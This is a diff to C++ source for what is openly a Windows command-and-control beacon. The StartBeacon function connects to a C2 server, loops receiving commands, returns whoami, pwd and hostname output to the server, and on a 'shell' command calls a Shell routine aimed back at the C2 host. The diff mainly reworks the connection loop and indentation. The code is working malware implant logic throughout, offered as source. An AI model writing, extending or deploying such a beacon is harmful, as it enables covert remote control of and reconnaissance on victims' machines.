@@ -130,8 +130,8 @@ void StartBeacon(char* C2Server, int C2Port)
 		Sleep(5000); // 1000 ms = 1s
 
 		SOCKET tcpsock;
-        sockaddr_in addr;
-        WSADATA wsversion;
+		sockaddr_in addr;
+		WSADATA wsversion;
 		// WSADATA object - contains details of application state regarding to network
 
 		// Version comparison - whether compiled version of sockets is compatible with the older versions
@@ -139,92 +139,97 @@ void StartBeacon(char* C2Server, int C2Port)
 
 		std::cout << "[DBG] Creating new socket..\n";
 		// WSASocket vs socket - same functionality, WSA.. has more options to work with.
-        tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+		tcpsock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
 
 		addr.sin_family = AF_INET;
 		addr.sin_addr.s_addr = inet_addr(C2Server);
 		addr.sin_port = htons(C2Port);
 
-		// This if statement performs connection and triggers if connection to C&C errored out.
-		if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
-			std::cout << "[-] Error during connection..\n";
-			closesocket(tcpsock);
-			WSACleanup();
-			continue;
-		}
+		int SOCK_STATE;
+		SOCK_STATE = connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr));
+		std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
 
-		// Else connection successfull..
-		else {
-			std::cout << "[DBG] Connected to " << C2Server << ":" << C2Port << std::endl;
-
-			// ----------------
-			// Connection verification block START
-			char RecvData[1024] = "";
-			memset(RecvData, 0, sizeof(RecvData));
-			
-			// here waits for any data input from Server
-			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
-			std::cout << "[DBG] 1st Recv: " << RecvData << std::endl;
-
-			if (RecvCode <= 0){
-				std::cout << "[DBG] RECVCODE = 0\n";
+		while (true) {
+				
+			// This if statement performs connection and triggers if connection to C&C errored out.
+			if (SOCK_STATE==SOCKET_ERROR) {
+				std::cout << "[-] Socket created with error..\n";
 				closesocket(tcpsock);
 				WSACleanup();
-				continue;
+				break;
 			}
-			// Connection verification block END
-			// ------------------
 
-			// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
-			if (strcmp(RecvData, "whoami\n") == 0) {
-				char buffer[257] = ""; // reserve buffer with length of 257 bytes
-				whoami(buffer); // call whoami function
-				strcat(buffer, "\n"); 
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
-			else if (strcmp(RecvData, "pwd\n") == 0) {
-				char buffer[257] = "";
-				pwd(buffer);
-				strcat(buffer, "\n"); 
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			else if (strcmp(RecvData, "hostname\n") == 0) {
-				char buffer[257] = "";
-				hostname(buffer);
-				strcat(buffer, "\n"); 
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			else if (strcmp(RecvData, "shell\n") == 0) {
-				Shell(C2Server,C2Port);
-			}
-			else if (strcmp(RecvData, "exit\n") == 0) {
-				std::cout << "Command parsed: exit" << std::endl;
-				std::cout << "Closing connection..." << std::endl;
-				Sleep(1000);
-				continue;
-			}
+			// Else connection successfull..
 			else {
-				std::cout << "[DBG]  Command received: " << RecvData << std::endl;
-				char buffer[20] = "Invalid command\n";
-				send(tcpsock,buffer,strlen(buffer)+1,0);
-				memset(buffer, 0, sizeof(buffer));
+				// ----------------
+				// Connection verification block START
+				char RecvData[1024] = "";
 				memset(RecvData, 0, sizeof(RecvData));
-			}
-			memset(RecvData, 0, sizeof(RecvData));
+				
+				// here waits for any data input from Server
+				int RecvCode = recv(tcpsock, RecvData, 1024, 0);
+				std::cout << "[DBG] 1st Recv: " << RecvData << std::endl;
+
+				if (RecvCode <= 0){
+					std::cout << "[DBG] RECVCODE = 0\n";
+					closesocket(tcpsock);
+					WSACleanup();
+					break;
+				}
+				// Connection verification block END
+				// ------------------
+
+				// Command parsed as whoami (strpcmp makes comparsion with predefined string in this case)
+				if (strcmp(RecvData, "whoami\n") == 0) {
+					char buffer[257] = ""; // reserve buffer with length of 257 bytes
+					whoami(buffer); // call whoami function
+					strcat(buffer, "\n"); 
+					send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+					// clear buffers
+					memset(buffer, 0, sizeof(buffer));
+					memset(RecvData, 0, sizeof(RecvData));
+				}
+				// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
+				else if (strcmp(RecvData, "pwd\n") == 0) {
+					char buffer[257] = "";
+					pwd(buffer);
+					strcat(buffer, "\n"); 
+					send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+					// clear buffers
+					memset(buffer, 0, sizeof(buffer));
+					memset(RecvData, 0, sizeof(RecvData));
+				}
+				else if (strcmp(RecvData, "hostname\n") == 0) {
+					char buffer[257] = "";
+					hostname(buffer);
+					strcat(buffer, "\n"); 
+					send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+					// clear buffers
+					memset(buffer, 0, sizeof(buffer));
+					memset(RecvData, 0, sizeof(RecvData));
+				}
+				else if (strcmp(RecvData, "shell\n") == 0) {
+					Shell(C2Server,C2Port);
+				}
+				else if (strcmp(RecvData, "exit\n") == 0) {
+					std::cout << "Command parsed: exit" << std::endl;
+					std::cout << "Closing connection..." << std::endl;
+					Sleep(1000);
+					break;
+				}
+				else {
+					std::cout << "[DBG]  Command received: " << RecvData << std::endl;
+					char buffer[20] = "Invalid command\n";
+					send(tcpsock,buffer,strlen(buffer)+1,0);
+					memset(buffer, 0, sizeof(buffer));
+					memset(RecvData, 0, sizeof(RecvData));
+				}
+				memset(RecvData, 0, sizeof(RecvData));
+				}
 		}
-	closesocket(tcpsock);
-	WSACleanup();
-	exit(0);
+		closesocket(tcpsock);
+		WSACleanup();
+		exit(0);
 	}
 	
 }
